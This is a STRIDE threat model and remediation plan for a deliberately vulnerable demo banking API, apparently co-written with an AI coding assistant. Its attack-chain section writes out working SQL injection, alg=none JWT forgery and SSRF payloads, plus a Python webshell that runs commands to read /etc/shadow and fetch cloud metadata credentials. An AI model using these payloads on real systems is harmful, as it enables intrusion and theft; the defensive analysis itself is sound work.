# STRIDE Threat Model — VulnBank API

**Date:** 2026-06-06
**Analyst:** r0ms3c + Claude Code
**Branch:** `main`
**Scope:** Full VulnBank API

---

## Step 1: System Decomposition

### Components

| ID | Component | File | Description |
|---|---|---|---|
| C1 | HTTP Entry Point | main.py | FastAPI app, global error handler, `/fetch`, `/health` |
| C2 | Auth Module | auth.py | Login, JWT issuance/validation, password reset |
| C3 | Database Module | db.py | Account lookup, search, fund transfers |
| C4 | Admin Module | admin.py | User CRUD, admin panel, debug token endpoint |
| C5 | File Module | files.py | Upload, download, list, delete |
| C6 | SQLite Database | vulnbank.db | Accounts, transactions, internal_notes |
| C7 | File System | uploads/ | User-uploaded files |
| C8 | External Network | (any) | Target of SSRF via `/fetch` |

### Entry Points

| EP | Endpoint | Auth Required | Notes |
|---|---|---|---|
| EP1 | `POST /auth/login` | None | Credential submission |
| EP2 | `POST /auth/forgot-password` | None | Username parameter |
| EP3 | `POST /auth/reset-password` | None | Token + new password |
| EP4 | `GET /auth/me` | Bearer JWT | Token introspection |
| EP5 | `GET /data/account` | Bearer JWT | `owner` query param — SQL injectable |
| EP6 | `GET /data/search` | Bearer JWT | `note` query param — SQL injectable |
| EP7 | `POST /data/transfer` | Bearer JWT | JSON body — SQL injectable |
| EP8 | `GET /admin/user/{id}` | Bearer JWT | IDOR |
| EP9 | `PUT /admin/user/{id}` | Bearer JWT | Mass assignment |
| EP10 | `DELETE /admin/user/{id}` | X-Admin-Key header | Static hardcoded key |
| EP11 | `GET /admin/panel` | Bearer JWT (role=admin) | JWT forgeable via alg=none |
| EP12 | `GET /admin/debug/tokens` | **None** | Returns valid JWTs for all users |
| EP13 | `GET /files/download` | Bearer JWT | Path traversal via `filename` |
| EP14 | `POST /files/upload` | Bearer JWT | Unrestricted file write |
| EP15 | `GET /files/list` | Bearer JWT | Lists all users' files |
| EP16 | `DELETE /files/delete` | Bearer JWT | No ownership check |
| EP17 | `GET /fetch` | **None** | SSRF — arbitrary outbound HTTP |
| EP18 | `GET /health` | **None** | Dumps SECRET_KEY + all env vars |
| EP19 | `GET /` | None | API root |

### Assets

| Asset | Sensitivity | Location |
|---|---|---|
| User credentials (hashes) | CRITICAL | USERS_DB in-memory — `auth.py:27` |
| JWT signing secret | CRITICAL | `auth.py:22`, `main.py:35` |
| Account balances | HIGH | SQLite `accounts` table |
| Transaction history | HIGH | SQLite `transactions` table |
| Internal notes (AWS keys, admin pw) | CRITICAL | SQLite `internal_notes` table |
| Uploaded files | MEDIUM | `uploads/` directory |
| Server environment variables | HIGH | OS environment |
| DB credentials | HIGH | `db.py:24-28` hardcoded |
| Admin API key | HIGH | `admin.py:99` hardcoded |

### Trust Boundaries

| TB | Between | Description |
|---|---|---|
| TB1 | Internet ↔ FastAPI | HTTP perimeter — unauthenticated callers reach all endpoints |
| TB2 | Unauthenticated ↔ Authenticated | JWT Bearer check in `get_current_user()` |
| TB3 | User role ↔ Admin role | Role claim inside JWT payload |
| TB4 | Application ↔ SQLite | Local DB access — no per-query access control |
| TB5 | Application ↔ File System | OS file I/O — no path containment |
| TB6 | Application ↔ External Network | Outbound HTTP via `/fetch` — no URL validation |

---

## Step 2: Data Flow Diagram

```
 ┌─────────────────────────────────────────────────────────────────────┐
 │  INTERNET (untrusted)                                               │
 │                                                                     │
 │  [Browser / curl / attacker tool]                                   │
 └──────────────────────────┬──────────────────────────────────────────┘
                            │ HTTP/8000 (any method)
                 ═══════════╪════════ TB1: Internet boundary ══════════
                            ▼
 ┌──────────────────────────────────────────────────────────────────┐
 │  FastAPI Router  (main.py)                                       │
 │  ┌──────────────────┐  ┌──────────────────┐                     │
 │  │ /fetch (no auth) │  │ /health (no auth) │  ← leak endpoints  │
 │  └────────┬─────────┘  └──────────────────┘                     │
 │           │ requests.get(user_url)                               │
 │           ▼                                                      │
 │  ════ TB6: App ↔ External Network ════                           │
 │           │                                                      │
 │  [External / Internal HTTP targets]                              │
 │                                                                  │
 │  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─│
 │  ┌────────────────────────────────────────────────────────────┐ │
 │  │ Auth Middleware  (auth.py → get_current_user)              │ │
 │  │  jwt.decode(algorithms=None) ← alg=none bypass            │ │
 │  └──────────────────────┬─────────────────────────────────────┘ │
 │              ═══════════╪══ TB2: Unauth ↔ Auth ════════════      │
 │                         ▼                                        │
 │  ┌────────────────────────────────────────────────────────────┐ │
 │  │ Business Logic Routers                                     │ │
 │  │                                                            │ │
 │  │  /auth/*    /data/*    /admin/*    /files/*               │ │
 │  │  (auth.py)  (db.py)    (admin.py)  (files.py)             │ │
 │  │                  │          │                              │ │
 │  │    ══════════════╪══ TB3: User ↔ Admin ══════════          │ │
 │  │                  │ role claim from JWT (forgeable)         │ │
 │  └──────────────────┼──────────────────────────────────────── ┘ │
 │                     │                                            │
 └─────────────────────┼────────────────────────────────────────────┘
                       │
          ┌────────────┴─────────────┐
          │                         │
          ▼                         ▼
 ══ TB4: App ↔ DB ══      ══ TB5: App ↔ FS ══
          │                         │
 ┌────────────────┐        ┌────────────────┐
 │  SQLite DB     │        │  File System   │
 │  accounts      │        │  uploads/      │
 │  transactions  │        │  (+ ../../..)  │ ← path traversal
 │  internal_notes│        └────────────────┘
 │  (AWS keys,    │
 │   admin pass)  │
 └────────────────┘
```

---

## Step 3: STRIDE Analysis

### TB1 — Internet → FastAPI (Unauthenticated surface)

**S — Spoofing**
- `GET /admin/debug/tokens` (EP12) returns valid signed JWTs for every user with no credentials. Attacker immediately impersonates any account including admin.
- `/fetch` (EP17) and `/health` (EP18) require no authentication — attacker identity is irrelevant.

**T — Tampering**
- No CSRF protection. State-changing endpoints (`POST /data/transfer`, `PUT /admin/user`, `DELETE /files/delete`) are reachable by cross-origin requests.
- `/fetch` allows the server to be used as a tamper-in-transit proxy to internal services.

**R — Repudiation**
- No access logging on any endpoint. There is no record that `/admin/debug/tokens` was called, no record of which IP fetched `/health`, no record of SSRF attempts.
- No request IDs or correlation IDs in responses.

**I — Information Disclosure**
- `/health` (EP18) returns `SECRET_KEY` and `dict(os.environ)` to any unauthenticated caller. Severity: CRITICAL.
- Every unhandled exception returns full Python traceback, `os.getcwd()`, and `DB_PASSWORD` in the HTTP 500 body (`main.py:55-67`).
- `/admin/debug/tokens` returns signed JWTs for all users.

**D — Denial of Service**
- `/fetch` with a large or slow target causes unbuffered reads; repeated calls saturate outbound bandwidth or the thread pool.
- No rate limiting on any endpoint — any endpoint can be flooded.

**E — Elevation of Privilege**
- `/admin/debug/tokens` grants admin-level JWT without any credential — complete privilege elevation from anonymous to admin in a single unauthenticated request.

---

### TB2 — Unauthenticated → Authenticated (JWT check)

**S — Spoofing**
- `algorithms=None` in `jwt.decode()` (`auth.py:110-113`) accepts `alg=none` tokens — attacker forges any identity with no secret knowledge.
- Weak JWT secret `"secret"` (`auth.py:22`) is trivially brute-forced offline against any captured token.
- Unsalted MD5 password hashes (`auth.py:28-43`) — once obtained via IDOR or SQL injection, all accounts crack in seconds via rainbow tables.
- Predictable reset token: `MD5(username + floor(unix_ts/60))` (`auth.py:132`) — attacker precomputes the current-minute token and resets any password.

**T — Tampering**
- Tokens have no `exp` claim and expiry check is disabled (`verify_exp: False`, `auth.py:114`). Stolen or forged tokens remain valid indefinitely.
- `POST /auth/reset-password` accepts no second factor; attacker with predictable token can change any user's password.

**R — Repudiation**
- Login events are not logged. Successful logins, failed attempts, and password resets leave no audit record.
- `login_attempts` dict tracks IPs but is never persisted and never enforced.

**I — Information Disclosure**
- `GET /auth/forgot-password` returns the reset token directly in the response body and leaks the generation algorithm in a `hint` field.
- Timing difference between non-existent usernames (fast return) and existing usernames (MD5 comparison) enables username enumeration.

**D — Denial of Service**
- No rate limiting or lockout on `POST /auth/login`. Attacker floods with credential guesses indefinitely.
- USERS_DB is in-memory; concurrent reset-password calls are not thread-safe.

**E — Elevation of Privilege**
- `alg=none` + forged `role=admin` claim bypasses all role checks downstream — direct path from anonymous to admin.

---

### TB3 — User Role → Admin Role

**S — Spoofing**
- JWT role claim is trusted server-side without any database lookup. Attacker forges `{"role": "admin"}` via `alg=none` and is treated as admin everywhere.

**T — Tampering**
- `PUT /admin/user/{id}` (EP9) accepts `{"role": "admin"}` from any authenticated user — no server-side role validation on the write. Any user self-promotes.
- `DELETE /admin/user/{id}` (EP10) relies on a static hardcoded key (`admin.py:99`). Anyone with repo access can delete any user.

**R — Repudiation**
- Admin panel access, user deletion, and mass assignment operations are not logged. No audit trail for privileged actions.

**I — Information Disclosure**
- `GET /admin/panel` returns the full `USERS_DB` including password hashes for all users.
- `GET /admin/user/{id}` (IDOR, EP8) returns `password_hash` for any user ID with no ownership check.

**D — Denial of Service**
- `DELETE /admin/user/{id}` with the static key can delete every user account, rendering the application unusable.

**E — Elevation of Privilege**
Three independent paths from user → admin:
1. `PUT /admin/user/{self_id}` with `{"role": "admin"}` (mass assignment)
2. Forge JWT with `alg=none` and `role=admin` claim
3. Call `GET /admin/debug/tokens` (unauthenticated), receive admin JWT

---

### TB4 — Application → SQLite

**S — Spoofing**
- SQLite has no user authentication; the application connects with full read/write rights regardless of the calling user's identity.

**T — Tampering**
- All three database endpoints use f-string SQL (`db.py:87`, `113`, `138-151`). Attacker controls query structure, not just parameters.
- `POST /data/transfer` has no ownership check on `from_account` — attacker drains any account by specifying a foreign account ID.
- SQL injection in the `note` field enables arbitrary SQL execution including multi-statement attacks.

**R — Repudiation**
- `internal_notes` table contains secrets but has no write-access log. An attacker who reads or modifies it leaves no trace.
- The transactions table records transfers but is itself injectable — records can be falsified or deleted.

**I — Information Disclosure**
- SQL injection via `UNION SELECT` dumps `internal_notes` (AWS credentials, admin password).
- Error handler (`db.py:93-95`, `117`) returns the raw SQL query string in HTTP responses — leaks schema and injection points.
- `GET /data/account?owner=' OR 1=1--` returns every account's balance.

**D — Denial of Service**
- No transaction isolation or row-level locking. Concurrent transfers can cause race conditions leading to double-spend or deadlock.
- Recursive CTE or deeply nested subquery via injection can cause high CPU usage.

**E — Elevation of Privilege**
- SQL injection in the `note` field of transfers could write data to any table, potentially inserting new admin-level records.

---

### TB5 — Application → File System

**S — Spoofing**
- No ownership metadata is stored with uploaded files. Any user can claim to act on any file.

**T — Tampering**
- `POST /files/upload` with `filename=../../app/auth.py` overwrites application source code.
- `DELETE /files/delete` with path traversal deletes arbitrary files.
- No file content validation — attacker uploads a Python script; `uvicorn --reload` (enabled because `DEBUG=True` in `main.py:114`) automatically loads it.

**R — Repudiation**
- No upload ownership tracking. There is no record of who uploaded what file.
- File deletion leaves no audit trail.

**I — Information Disclosure**
- `GET /files/download?filename=../../etc/passwd` reads arbitrary OS files.
- `GET /files/download?filename=../../app/auth.py` exposes JWT secret, all password hashes, and the admin key.
- `GET /files/list` returns server-side file paths for all uploaded files to all users.

**D — Denial of Service**
- No file size limit on upload. Attacker uploads multi-GB files to exhaust disk space, preventing SQLite from writing WAL entries.
- Repeated large-file downloads saturate server I/O.

**E — Elevation of Privilege**
- Upload of a `.py` file to `../../app/` overwrites legitimate application code. With `uvicorn --reload` active, modified code executes as the server process within seconds — achieving RCE.

---

### TB6 — Application → External Network (SSRF)

**S — Spoofing**
- The server makes requests as itself — its IP and attached cloud IAM role are used. Attacker spoofs the origin of requests to internal services using the server as a proxy.

**T — Tampering**
- Attacker uses SSRF to send crafted requests to internal APIs that would be firewalled from the internet (e.g., `PUT http://10.0.0.1/admin/config`).

**R — Repudiation**
- SSRF requests appear in target server logs as originating from the application server IP — no way to attribute to the actual attacker.

**I — Information Disclosure**
- `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` — AWS IAM role credentials.
- `GET /fetch?url=http://localhost:6379` — Redis instance discovery and potential data read.
- `GET /fetch?url=file:///etc/passwd` — local file read via `file://` scheme.

**D — Denial of Service**
- SSRF to slow or blocked hosts holds a thread for the full `timeout=5` seconds. Parallel flooding exhausts the thread pool.

**E — Elevation of Privilege**
- Stolen AWS IAM credentials grant cloud-level access (S3, EC2, RDS, Secrets Manager) far beyond the application boundary.

---

## Step 4: Threat Table

| ID | Component | STRIDE | Threat | Likelihood | Impact | Risk | Control |
|---|---|---|---|---|---|---|---|
| T01 | Auth (TB2) | **S** | JWT `alg=none` — forge any identity | CRITICAL | CRITICAL | **CRITICAL** | Pin `algorithms=["HS256"]`; upgrade PyJWT |
| T02 | Admin (TB1) | **E** | Unauthenticated debug token endpoint — instant admin JWT | CRITICAL | CRITICAL | **CRITICAL** | Remove endpoint |
| T03 | DB (TB4) | **I/T** | SQL injection `/data/account` — full DB dump | HIGH | CRITICAL | **CRITICAL** | Parameterized queries |
| T04 | DB (TB4) | **I/T** | SQL injection `/data/search` — UNION dump | HIGH | CRITICAL | **CRITICAL** | Parameterized queries |
| T05 | DB (TB4) | **I/T** | SQL injection `/data/transfer` (3 injection points) | HIGH | CRITICAL | **CRITICAL** | Parameterized queries |
| T06 | Main (TB6) | **I/E** | SSRF — AWS metadata / internal services | HIGH | CRITICAL | **CRITICAL** | URL allowlist + private IP blocking |
| T07 | Files (TB5) | **I** | Path traversal download — arbitrary file read | HIGH | CRITICAL | **CRITICAL** | Path containment check |
| T08 | Main (TB1) | **I** | `/health` exposes SECRET_KEY + full env | CRITICAL | CRITICAL | **CRITICAL** | Remove secret fields from health response |
| T09 | Main (TB1) | **I** | HTTP 500 leaks DB_PASSWORD + stack trace | HIGH | CRITICAL | **CRITICAL** | Generic error handler |
| T10 | Admin (TB3) | **S/I** | IDOR — any user reads any password hash | HIGH | HIGH | **HIGH** | Ownership + role check |
| T11 | DB (TB4) | **T** | No ownership check on fund transfer | HIGH | HIGH | **HIGH** | Assert `from_account.owner == current_user` |
| T12 | Admin (TB3) | **E** | Mass assignment — user sets own role=admin | HIGH | HIGH | **HIGH** | Strip `role` from user-writable fields |
| T13 | Auth (TB2) | **S** | Weak JWT secret `"secret"` — offline brute-force | HIGH | HIGH | **HIGH** | Replace with 256-bit random secret from env |
| T14 | Auth (TB2) | **S** | MD5 unsalted passwords — instant rainbow crack | HIGH | HIGH | **HIGH** | bcrypt/argon2 with per-user salt |
| T15 | Auth (TB2) | **T** | JWT tokens never expire | HIGH | HIGH | **HIGH** | Add `exp` claim; enforce in decode |
| T16 | Auth (TB2) | **D** | No rate limiting on login — unlimited brute force | HIGH | HIGH | **HIGH** | slowapi / token-bucket rate limiter |
| T17 | Files (TB5) | **T/E** | Unrestricted upload + `--reload` = RCE | MEDIUM | CRITICAL | **HIGH** | Extension allowlist; disable reload in prod |
| T18 | Auth (TB2) | **S** | Predictable reset token — account takeover | MEDIUM | HIGH | **HIGH** | `secrets.token_urlsafe(32)`; single-use |
| T19 | Admin (TB3) | **R** | No audit logging on admin/transfer/delete | HIGH | MEDIUM | **HIGH** | Structured access log with user + action |
| T20 | Auth (TB2) | **I** | Username enumeration via timing attack | MEDIUM | MEDIUM | **MEDIUM** | `hmac.compare_digest()` for hash comparison |
| T21 | Files (TB5) | **T** | Path traversal upload — overwrite app source | MEDIUM | CRITICAL | **HIGH** | Path containment; reject `..` in filename |
| T22 | All (TB1) | **D** | No rate limiting on any endpoint — DDoS | MEDIUM | MEDIUM | **MEDIUM** | Global rate limiter middleware |
| T23 | Files (TB5) | **D** | No upload size limit — disk exhaustion | MEDIUM | HIGH | **MEDIUM** | `MAX_UPLOAD_SIZE` + `Content-Length` check |
| T24 | Auth (TB2) | **I** | Reset token returned in response body | HIGH | MEDIUM | **MEDIUM** | Send via out-of-band channel (email) |
| T25 | DB (TB4) | **I** | Raw SQL query in error responses | HIGH | MEDIUM | **MEDIUM** | Generic DB error message |
| T26 | Admin (TB3) | **T** | Static admin key in source — user deletion by anyone | MEDIUM | HIGH | **MEDIUM** | Use signed admin JWT + MFA |
| T27 | All (TB1) | **R** | No request logging — attacks leave no trace | HIGH | HIGH | **HIGH** | Structured access log + SIEM forwarding |
| T28 | Files (TB5) | **I** | Directory listing — all users see all files | LOW | MEDIUM | **LOW** | Filter by `owner` field |
| T29 | Main (TB1) | **I** | Server binds `0.0.0.0` — exposed on all interfaces | LOW | LOW | **LOW** | Bind to `127.0.0.1` behind a reverse proxy |
| T30 | DB (TB4) | **T** | Transfer race condition — no row-level locking | LOW | HIGH | **MEDIUM** | Serializable transaction on transfer |

---

## Step 5: Attack Chains

### Chain 1 — Anonymous to Full Database Dump in 2 Requests

**Preconditions:** Network access to port 8000. No credentials required.

```
Step 1 — Obtain admin JWT (unauthenticated):
  GET /admin/debug/tokens
  → {"admin": "<signed_jwt>", "alice": "...", "bob": "..."}
  Threat: T02

Step 2 — Dump internal_notes via SQL injection:
  GET /data/account?owner=' UNION SELECT id,content,0,'x' FROM internal_notes--
  Authorization: Bearer <admin_jwt_from_step1>
  → [{"id":1,"owner":"AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE",...},
     {"id":2,"owner":"Admin password: P@ssw0rd!",...]
  Threat: T03

Step 3 (escalation) — Use stolen AWS key to access cloud:
  AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws s3 ls
  → Lists all S3 buckets accessible by the IAM role
```

**Total time to execute:** ~30 seconds.
**Impact:** Full database exfiltration including AWS credentials; cloud lateral movement.

---

### Chain 2 — JWT Forgery to Remote Code Execution via File Upload

**Preconditions:** Network access. No credentials required.

```
Step 1 — Forge admin JWT using alg=none:
  header:  {"alg":"none","typ":"JWT"}
  payload: {"sub":"attacker","role":"admin","id":99}
  sig:     (empty — trailing dot only)
  Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImlkIjo5OX0.
  Threat: T01

Step 2 — Upload a Python webshell overwriting app source:
  POST /files/upload
  Authorization: Bearer <forged_jwt>
  filename: ../../app/admin.py
  content:
    import os
    from fastapi import APIRouter
    router = APIRouter()
    @router.get("/rce")
    async def rce(cmd: str):
        return {"out": os.popen(cmd).read()}
  Threat: T17, T21

Step 3 — Trigger automatic reload:
  uvicorn runs with --reload because DEBUG=True (main.py:114)
  → Modified admin.py is hot-loaded within seconds automatically

Step 4 — Execute arbitrary OS commands:
  GET /admin/rce?cmd=id
  → {"out": "uid=0(root) gid=0(root)\n"}

Step 5 — Pivot to host and cloud:
  GET /admin/rce?cmd=env
  GET /admin/rce?cmd=cat /etc/shadow
  GET /admin/rce?cmd=curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** Full remote code execution as the server process; complete host compromise; cloud pivot.

---

### Chain 3 — Credential Theft to Persistent Admin Backdoor

**Preconditions:** One low-privilege account (alice / password).

```
Step 1 — Login and get alice's JWT:
  POST /auth/login {"username":"alice","password":"password"}
  → {"access_token": "<alice_jwt>"}

Step 2 — IDOR to read admin's password hash:
  GET /admin/user/1
  Authorization: Bearer <alice_jwt>
  → {"id":1,"username":"admin","role":"admin",
     "password_hash":"0192023a7bbd73250516f069df18b500"}
  Threat: T10

Step 3 — Crack MD5 offline (instantaneous via rainbow tables):
  echo -n "admin123" | md5sum → 0192023a7bbd73250516f069df18b500 ✓
  Cracked password: admin123

Step 4 — Login as admin:
  POST /auth/login {"username":"admin","password":"admin123"}
  → {"access_token": "<admin_jwt>"}

Step 5 — Download application source to extract JWT secret:
  GET /files/download?filename=../../app/auth.py
  Authorization: Bearer <admin_jwt>
  → Returns auth.py source: JWT_SECRET = "secret"
  Threat: T07, T13

Step 6 — Mint arbitrary long-lived admin tokens offline:
  import jwt
  jwt.encode({"sub":"attacker","role":"admin"}, "secret", algorithm="HS256")
  → Persistent backdoor token — survives all password resets
```

**Impact:** Persistent admin access via offline-minted tokens. Even if the admin password is reset, the attacker holds a valid forever-token signed with the hardcoded secret.

---

## Step 6: Mitigations

### CRITICAL Threats

| Threat | Control | Effort | Design Change? |
|---|---|---|---|
| T01 — alg=none | Set `algorithms=["HS256"]` in `jwt.decode()`; upgrade `PyJWT>=2.4.0`; remove `verify_exp: False` | 15 min | No |
| T02 — Debug token endpoint | Remove `GET /admin/debug/tokens` entirely | 5 min | No |
| T03–T05 — SQL injection | Parameterized queries everywhere: `db.execute("SELECT * FROM accounts WHERE owner = ?", (owner,))` | 1 hr | No |
| T06 — SSRF | Allowlist scheme to `https`; block RFC-1918 + `169.254/16` with `ipaddress` module; `allow_redirects=False` | 2 hr | No |
| T07 — Path traversal (download) | `safe = (Path(UPLOAD_DIR).resolve() / Path(fn).name).resolve()`; assert prefix | 30 min | No |
| T08 — `/health` leaks | Return only `{"status":"ok","version":"1.0.0"}`; remove `secret_key` and `environment` keys | 10 min | No |
| T09 — 500 leaks DB_PASSWORD | Generic handler: `{"error":"Internal server error"}`; log details server-side only | 15 min | No |

### HIGH Threats

| Threat | Control | Effort | Design Change? |
|---|---|---|---|
| T10 — IDOR | `if current_user["id"] != user_id and current_user["role"] != "admin": raise 403` | 30 min | No |
| T11 — Unauthorized transfer | Assert `account.owner == current_user["sub"]` before debit | 30 min | No |
| T12 — Mass assignment | Remove `role` from `UpdateUserRequest`; expose as admin-only field on a separate endpoint | 20 min | No |
| T13 — Weak JWT secret | Replace with `secrets.token_hex(32)` loaded from environment variable | 15 min | No |
| T14 — MD5 passwords | Migrate to `bcrypt.hashpw(pw.encode(), bcrypt.gensalt())` | 1 hr | Yes — migration script needed |
| T15 — No token expiry | Add `"exp": datetime.utcnow() + timedelta(hours=1)` to JWT; remove `verify_exp: False` | 20 min | No |
| T16 — No rate limiting | Add `slowapi` middleware: 5 login attempts/minute per IP with exponential backoff | 1 hr | No |
| T17 — File upload RCE | Extension allowlist `{".jpg",".png",".pdf"}`; generate random filename; disable `--reload` in prod | 1 hr | Yes |
| T18 — Predictable reset | Replace with `secrets.token_urlsafe(32)`; store server-side with 15-min TTL; invalidate on use | 1 hr | Yes — token store needed |
| T19 — No audit log | Structured log every request: `{ts, ip, user, method, path, status}` | 2 hr | Yes — middleware |
| T21 — Path traversal (upload) | Same containment fix as T07; additionally reject any filename containing `..` or `/` | 30 min | No |
| T27 — No request logging | FastAPI middleware to emit structured access logs to stdout/SIEM | 1 hr | No |

### Remediation Code Snippets

#### JWT Algorithm Pinning (T01)
```python
# Before (vulnerable) — auth.py:110
payload = jwt.decode(token, JWT_SECRET, algorithms=None, options={"verify_exp": False})

# After (secure)
payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```
**CWE:** CWE-345

#### SQL Injection (T03–T05)
```python
# Before (vulnerable) — db.py:87
query = f"SELECT * FROM accounts WHERE owner = '{owner}'"
result = db.execute(query).fetchall()

# After (secure)
result = db.execute("SELECT * FROM accounts WHERE owner = ?", (owner,)).fetchall()
```
**CWE:** CWE-89

#### Path Traversal (T07, T21)
```python
# Before (vulnerable) — files.py:41
file_path = os.path.join(UPLOAD_DIR, filename)

# After (secure)
safe_path = (Path(UPLOAD_DIR).resolve() / Path(filename).name).resolve()
if not str(safe_path).startswith(str(Path(UPLOAD_DIR).resolve())):
    raise HTTPException(status_code=400, detail="Invalid filename")
file_path = safe_path
```
**CWE:** CWE-22

#### SSRF (T06)
```python
# Before (vulnerable) — main.py:84
response = requests.get(url, timeout=5)

# After (secure)
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

parsed = urlparse(url)
if parsed.scheme not in ALLOWED_SCHEMES:
    raise HTTPException(400, "Scheme not allowed")
try:
    addr = ipaddress.ip_address(parsed.hostname)
    if any(addr in net for net in BLOCKED_RANGES):
        raise HTTPException(400, "Private addresses not allowed")
except ValueError:
    pass  # hostname — also consider DNS rebinding mitigations
response = requests.get(url, timeout=5, allow_redirects=False)
```
**CWE:** CWE-918

---

## Step 7: Residual Risk

After all mitigations are applied, the following risks remain:

| Residual Risk | Why It Remains | Monitoring Signal |
|---|---|---|
| **Credential stuffing** | Distributed bots spray credentials at sub-threshold rates that bypass per-IP limits | Alert on >3 failed logins per user across any IPs within 10 min |
| **JWT secret leak via env dump** | Moving the secret to an env var reduces but doesn't eliminate risk if the environment is exposed via another vulnerability | Alert on unexpected `GET /auth/me` spikes; rotate secret on any suspected compromise |
| **SSRF via DNS rebinding** | After IP blocking, DNS rebinding resolves an external hostname to a private IP post-validation | Use SSRF-aware HTTP library that validates after DNS resolution, not before |
| **Stored XSS in uploaded files** | Even with extension allowlist, SVG and HTML files carry XSS if served inline | Serve uploads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` |
| **Transfer race condition** | Concurrent transfers without row locking cause double-spend | Wrap transfers in `BEGIN IMMEDIATE` transaction; alert on negative balances |
| **Brute-force reset token** | Even with `secrets.token_urlsafe(32)`, a missing expiry or reuse window allows grinding | Alert on >5 reset attempts per user per hour; expire tokens in 15 min; single-use only |
| **JWT forgery if secret leaks** | If the JWT secret is ever exposed, all tokens can be forged | Rotate JWT secret on any security incident; alert on tokens with `iat` far in the past |

### Recommended SIEM Detection Rules

```
Rule 1: Brute Force
  Condition: ≥5 failed logins from any single IP within 60s
  Action:    Alert + temporary IP block

Rule 2: Credential Stuffing
  Condition: Login success following ≥3 failures on the same account
  Action:    Alert + require MFA step-up

Rule 3: Access Control Bypass
  Condition: Request to /admin/* where JWT sub does not match path user_id
  Action:    Alert + log full request

Rule 4: Injection Probing
  Condition: HTTP 500 response rate > 1% over a 5-minute window
  Action:    Alert + increase log verbosity

Rule 5: SSRF Attempt
  Condition: /fetch called with a private-range or metadata-service URL
  Action:    Alert + block IP

Rule 6: Webshell Upload
  Condition: File upload with extension outside approved allowlist
  Action:    Alert + quarantine file + notify security team

Rule 7: Token Forgery Probing
  Condition: JWT decode failure spike (>10 in 60s from same IP)
  Action:    Alert + IP block

Rule 8: Financial Integrity
  Condition: Account balance < 0 after any transfer
  Action:    Alert + rollback transaction + flag for review
```

---

*Generated by Claude Code stride-threat-model skill — VulnBank is a deliberately vulnerable demo application. Do not deploy in any real environment.*
